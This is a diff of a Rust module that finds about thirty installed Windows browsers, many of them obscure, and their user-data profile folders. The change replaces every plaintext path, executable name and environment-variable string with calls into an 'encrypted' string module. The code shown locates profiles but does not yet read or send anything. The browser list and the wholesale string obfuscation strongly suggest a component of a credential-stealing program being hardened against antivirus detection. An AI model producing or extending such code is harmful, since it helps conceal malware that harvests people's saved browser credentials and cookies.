@@ -3,6 +3,7 @@
 use std::env;
 use std::path::{Path, PathBuf};
 use crate::dbg_log;
+use crate::encrypted::*;
 
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 pub enum DataRoot {
@@ -20,93 +21,92 @@ pub struct BrowserPath {
 }
 
 fn fallback_for(exe_name: &str) -> Option<PathBuf> {
-    let pf = env::var("ProgramFiles").unwrap_or_default();
-    let pf86 = env::var("ProgramFiles(x86)").unwrap_or_default();
-    let local = env::var("LOCALAPPDATA").unwrap_or_default();
-    let roaming = env::var("APPDATA").unwrap_or_default();
+    let pf = env::var(s_env_programfiles()).unwrap_or_default();
+    let pf86 = env::var(s_env_programfiles86()).unwrap_or_default();
+    let local = env::var(s_localappdata()).unwrap_or_default();
+    let roaming = env::var(s_appdata()).unwrap_or_default();
 
     let exe_path = |base: &str, sub: &str| -> PathBuf {
         PathBuf::from(base).join(sub).join(exe_name)
     };
 
-    let candidates: Vec<PathBuf> = match exe_name {
-        "chrome.exe" => vec![
-            exe_path(&pf, "Google\\Chrome\\Application"),
-            exe_path(&pf86, "Google\\Chrome\\Application"),
-            exe_path(&local, "Google\\Chrome\\Application"),
-        ],
-        "msedge.exe" => vec![
-            exe_path(&pf, "Microsoft\\Edge\\Application"),
-            exe_path(&pf86, "Microsoft\\Edge\\Application"),
-            exe_path(&local, "Microsoft\\Edge\\Application"),
-        ],
-        "brave.exe" => vec![
-            exe_path(&pf, "BraveSoftware\\Brave-Browser\\Application"),
-            exe_path(&pf86, "BraveSoftware\\Brave-Browser\\Application"),
-            exe_path(&local, "BraveSoftware\\Brave-Browser\\Application"),
-            exe_path(&local, "BraveSoftware\\Brave-Browser-Beta\\Application"),
-            exe_path(&local, "BraveSoftware\\Brave-Browser-Nightly\\Application"),
-        ],
-        "vivaldi.exe" => vec![
-            exe_path(&local, "Vivaldi\\Application"),
-            exe_path(&pf, "Vivaldi\\Application"),
-        ],
-        "opera.exe" => vec![
-            exe_path(&local, "Programs\\Opera"),
-            exe_path(&local, "Programs\\Opera GX"),
-            exe_path(&pf, "Opera"),
-            exe_path(&roaming, "Opera Software\\Opera Stable"),
-        ],
-        "browser.exe" => vec![
-            exe_path(&local, "Yandex\\YandexBrowser\\Application"),
-            exe_path(&pf, "Yandex\\YandexBrowser\\Application"),
-            exe_path(&local, "CocCoc\\Browser\\Application"),
-        ],
-        "360chrome.exe" => vec![
-            exe_path(&local, "360Chrome\\Chrome\\Application"),
-        ],
-        "epic.exe" => vec![
-            exe_path(&local, "Epic Privacy Browser\\Application"),
-            exe_path(&pf, "Epic Privacy Browser\\Application"),
-        ],
-        "centbrowser.exe" => vec![
-            exe_path(&local, "CentBrowser\\Application"),
-            exe_path(&pf, "CentBrowser\\Application"),
-        ],
-        "torch.exe" => vec![
-            exe_path(&local, "Torch\\Application"),
-        ],
-        "slimjet.exe" => vec![
-            exe_path(&local, "Slimjet\\Application"),
-        ],
-        "iridium.exe" => vec![
-            exe_path(&local, "Iridium\\Application"),
-        ],
-        "thorium.exe" => vec![
-            exe_path(&local, "Thorium\\Application"),
-        ],
-        "7star.exe" => vec![
-            exe_path(&local, "7Star\\7Star\\Application"),
-        ],
-        "orbitum.exe" => vec![
-            exe_path(&local, "Orbitum\\Application"),
-        ],
-        "kometa.exe" => vec![
-            exe_path(&local, "Kometa\\Application"),
-        ],
-        "amigo.exe" => vec![
-            exe_path(&local, "Amigo\\Application"),
-        ],
-        "sputnik.exe" => vec![
-            exe_path(&local, "Sputnik\\Sputnik\\Application"),
-        ],
-        "uran.exe" => vec![
-            exe_path(&local, "uCozMedia\\Uran\\Application"),
-        ],
-        "Arc.exe" | "arc.exe" => vec![
-            exe_path(&local, "The Browser Company\\Arc\\Application"),
-        ],
-        _ => Vec::new(),
+    let candidates: Vec<PathBuf> = {
+        let e = exe_name;
+        if e == s_path_chrome_exe() {
+            vec![
+                exe_path(&pf, &s_path_app_chrome()),
+                exe_path(&pf86, &s_path_app_chrome()),
+                exe_path(&local, &s_path_app_chrome()),
+            ]
+        } else if e == s_path_msedge_exe() {
+            vec![
+                exe_path(&pf, &s_path_app_edge()),
+                exe_path(&pf86, &s_path_app_edge()),
+                exe_path(&local, &s_path_app_edge()),
+            ]
+        } else if e == s_path_brave_exe() {
+            vec![
+                exe_path(&pf, &s_path_app_brave()),
+                exe_path(&pf86, &s_path_app_brave()),
+                exe_path(&local, &s_path_app_brave()),
+                exe_path(&local, &s_path_app_brave_beta()),
+                exe_path(&local, &s_path_app_brave_nightly()),
+            ]
+        } else if e == s_path_vivaldi_exe() {
+            vec![
+                exe_path(&local, &s_path_app_vivaldi()),
+                exe_path(&pf, &s_path_app_vivaldi()),
+            ]
+        } else if e == s_path_opera_exe() {
+            vec![
+                exe_path(&local, &s_path_app_opera()),
+                exe_path(&local, &s_path_app_opera_gx()),
+                exe_path(&pf, &s_browser_opera()),
+                exe_path(&roaming, &s_path_app_opera_roaming()),
+            ]
+        } else if e == s_path_browser_exe() {
+            vec![
+                exe_path(&local, &s_path_app_yandex()),
+                exe_path(&pf, &s_path_app_yandex()),
+                exe_path(&local, &s_path_app_coccoc()),
+            ]
+        } else if e == s_path_360chrome_exe() {
+            vec![exe_path(&local, &s_path_app_360())]
+        } else if e == s_path_epic_exe() {
+            vec![
+                exe_path(&local, &s_path_app_epic()),
+                exe_path(&pf, &s_path_app_epic()),
+            ]
+        } else if e == s_path_centbrowser_exe() {
+            vec![
+                exe_path(&local, &s_path_app_cent()),
+                exe_path(&pf, &s_path_app_cent()),
+            ]
+        } else if e == s_path_torch_exe() {
+            vec![exe_path(&local, &s_path_app_torch())]
+        } else if e == s_path_slimjet_exe() {
+            vec![exe_path(&local, &s_path_app_slimjet())]
+        } else if e == s_path_iridium_exe() {
+            vec![exe_path(&local, &s_path_app_iridium())]
+        } else if e == s_path_thorium_exe() {
+            vec![exe_path(&local, &s_path_app_thorium())]
+        } else if e == s_path_7star_exe() {
+            vec![exe_path(&local, &s_path_app_7star())]
+        } else if e == s_path_orbitum_exe() {
+            vec![exe_path(&local, &s_path_app_orbitum())]
+        } else if e == s_path_kometa_exe() {
+            vec![exe_path(&local, &s_path_app_kometa())]
+        } else if e == s_path_amigo_exe() {
+            vec![exe_path(&local, &s_path_app_amigo())]
+        } else if e == s_path_sputnik_exe() {
+            vec![exe_path(&local, &s_path_app_sputnik())]
+        } else if e == s_path_uran_exe() {
+            vec![exe_path(&local, &s_path_app_uran())]
+        } else if e == s_path_arc_exe() || e.eq_ignore_ascii_case(&s_path_arc_exe()) {
+            vec![exe_path(&local, &s_path_app_arc())]
+        } else {
+            Vec::new()
+        }
     };
 
     for c in candidates {
@@ -124,43 +124,43 @@ pub fn find_app_path(exe_name: &str) -> Option<PathBuf> {
 
 pub fn all_browsers() -> Vec<BrowserPath> {
     vec![
-        BrowserPath { name: "Chrome".into(), exe: "chrome.exe".into(), user_data_rel: r"Google\Chrome\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Chrome Beta".into(), exe: "chrome.exe".into(), user_data_rel: r"Google\Chrome Beta\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Chrome Dev".into(), exe: "chrome.exe".into(), user_data_rel: r"Google\Chrome Dev\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Chrome Canary".into(), exe: "chrome.exe".into(), user_data_rel: r"Google\Chrome SxS\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Chromium".into(), exe: "chrome.exe".into(), user_data_rel: r"Chromium\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Edge".into(), exe: "msedge.exe".into(), user_data_rel: r"Microsoft\Edge\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Edge Beta".into(), exe: "msedge.exe".into(), user_data_rel: r"Microsoft\Edge Beta\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Edge Dev".into(), exe: "msedge.exe".into(), user_data_rel: r"Microsoft\Edge Dev\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Brave".into(), exe: "brave.exe".into(), user_data_rel: r"BraveSoftware\Brave-Browser\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Brave Beta".into(), exe: "brave.exe".into(), user_data_rel: r"BraveSoftware\Brave-Browser-Beta\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Brave Nightly".into(), exe: "brave.exe".into(), user_data_rel: r"BraveSoftware\Brave-Browser-Nightly\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Opera".into(), exe: "opera.exe".into(), user_data_rel: r"Opera Software\Opera Stable".into(), root: DataRoot::Roaming, has_profiles: false },
-        BrowserPath { name: "OperaGX".into(), exe: "opera.exe".into(), user_data_rel: r"Opera Software\Opera GX Stable".into(), root: DataRoot::Roaming, has_profiles: false },
-        BrowserPath { name: "Opera Neon".into(), exe: "opera.exe".into(), user_data_rel: r"Opera Software\Opera Neon\User Data".into(), root: DataRoot::Roaming, has_profiles: true },
-        BrowserPath { name: "Vivaldi".into(), exe: "vivaldi.exe".into(), user_data_rel: r"Vivaldi\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Yandex".into(), exe: "browser.exe".into(), user_data_rel: r"Yandex\YandexBrowser\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "CocCoc".into(), exe: "browser.exe".into(), user_data_rel: r"CocCoc\Browser\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "CentBrowser".into(), exe: "centbrowser.exe".into(), user_data_rel: r"CentBrowser\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "360Chrome".into(), exe: "360chrome.exe".into(), user_data_rel: r"360Chrome\Chrome\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Epic Privacy Browser".into(), exe: "epic.exe".into(), user_data_rel: r"Epic Privacy Browser\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Uran".into(), exe: "uran.exe".into(), user_data_rel: r"uCozMedia\Uran\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "7Star".into(), exe: "7star.exe".into(), user_data_rel: r"7Star\7Star\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Torch".into(), exe: "torch.exe".into(), user_data_rel: r"Torch\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Kometa".into(), exe: "kometa.exe".into(), user_data_rel: r"Kometa\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Orbitum".into(), exe: "orbitum.exe".into(), user_data_rel: r"Orbitum\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Amigo".into(), exe: "amigo.exe".into(), user_data_rel: r"Amigo\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Sputnik".into(), exe: "sputnik.exe".into(), user_data_rel: r"Sputnik\Sputnik\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Slimjet".into(), exe: "slimjet.exe".into(), user_data_rel: r"Slimjet\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Iridium".into(), exe: "iridium.exe".into(), user_data_rel: r"Iridium\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Thorium".into(), exe: "thorium.exe".into(), user_data_rel: r"Thorium\User Data".into(), root: DataRoot::Local, has_profiles: true },
-        BrowserPath { name: "Arc".into(), exe: "Arc.exe".into(), user_data_rel: r"The Browser Company\Arc\User Data".into(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_chrome(), exe: s_path_chrome_exe(), user_data_rel: s_path_chrome_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_chrome_beta(), exe: s_path_chrome_exe(), user_data_rel: s_path_chrome_beta_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_chrome_dev(), exe: s_path_chrome_exe(), user_data_rel: s_path_chrome_dev_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_chrome_canary(), exe: s_path_chrome_exe(), user_data_rel: s_path_chrome_sxs_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_chromium(), exe: s_path_chrome_exe(), user_data_rel: s_path_chromium_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_edge(), exe: s_path_msedge_exe(), user_data_rel: s_path_edge_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_edge_beta(), exe: s_path_msedge_exe(), user_data_rel: s_path_edge_beta_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_edge_dev(), exe: s_path_msedge_exe(), user_data_rel: s_path_edge_dev_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_brave(), exe: s_path_brave_exe(), user_data_rel: s_path_brave_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_brave_beta(), exe: s_path_brave_exe(), user_data_rel: s_path_brave_beta_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_brave_nightly(), exe: s_path_brave_exe(), user_data_rel: s_path_brave_nightly_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_opera(), exe: s_path_opera_exe(), user_data_rel: s_path_opera_stable_ud_rel(), root: DataRoot::Roaming, has_profiles: false },
+        BrowserPath { name: s_browser_opera_gx_name(), exe: s_path_opera_exe(), user_data_rel: s_path_opera_gx_ud_rel(), root: DataRoot::Roaming, has_profiles: false },
+        BrowserPath { name: s_paths_opera_neon(), exe: s_path_opera_exe(), user_data_rel: s_path_opera_neon_ud_rel(), root: DataRoot::Roaming, has_profiles: true },
+        BrowserPath { name: s_browser_vivaldi(), exe: s_path_vivaldi_exe(), user_data_rel: s_path_vivaldi_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_yandex(), exe: s_path_browser_exe(), user_data_rel: s_path_yandex_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_coccoc_name(), exe: s_path_browser_exe(), user_data_rel: s_path_coccoc_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_cent_name(), exe: s_path_centbrowser_exe(), user_data_rel: s_path_cent_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_360chrome_name(), exe: s_path_360chrome_exe(), user_data_rel: s_path_360_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_epic_name(), exe: s_path_epic_exe(), user_data_rel: s_path_epic_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_uran_name(), exe: s_path_uran_exe(), user_data_rel: s_path_uran_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_7star_name(), exe: s_path_7star_exe(), user_data_rel: s_path_7star_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_torch_name(), exe: s_path_torch_exe(), user_data_rel: s_path_torch_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_kometa_name(), exe: s_path_kometa_exe(), user_data_rel: s_path_kometa_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_orbitum_name(), exe: s_path_orbitum_exe(), user_data_rel: s_path_orbitum_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_amigo_name(), exe: s_path_amigo_exe(), user_data_rel: s_path_amigo_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_sputnik_name(), exe: s_path_sputnik_exe(), user_data_rel: s_path_sputnik_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_slimjet_name(), exe: s_path_slimjet_exe(), user_data_rel: s_path_slimjet_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_iridium_name(), exe: s_path_iridium_exe(), user_data_rel: s_path_iridium_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_thorium_name(), exe: s_path_thorium_exe(), user_data_rel: s_path_thorium_ud_rel(), root: DataRoot::Local, has_profiles: true },
+        BrowserPath { name: s_browser_arc_name(), exe: s_path_arc_exe(), user_data_rel: s_path_arc_ud_rel(), root: DataRoot::Local, has_profiles: true },
     ]
 }
 
 pub fn discover_installed_browsers() -> Vec<BrowserPath> {
-    let local = env::var("LOCALAPPDATA").unwrap_or_default();
-    let roaming = env::var("APPDATA").unwrap_or_default();
+    let local = env::var(s_localappdata()).unwrap_or_default();
+    let roaming = env::var(s_appdata()).unwrap_or_default();
     let mut installed = Vec::new();
 
     for b in all_browsers() {
@@ -191,8 +191,8 @@ pub fn discover_installed_browsers() -> Vec<BrowserPath> {
 
 pub fn user_data_path(b: &BrowserPath) -> PathBuf {
     let root = match b.root {
-        DataRoot::Local => env::var("LOCALAPPDATA").unwrap_or_default(),
-        DataRoot::Roaming => env::var("APPDATA").unwrap_or_default(),
+        DataRoot::Local => env::var(s_localappdata()).unwrap_or_default(),
+        DataRoot::Roaming => env::var(s_appdata()).unwrap_or_default(),
     };
     PathBuf::from(root).join(&b.user_data_rel)
 }
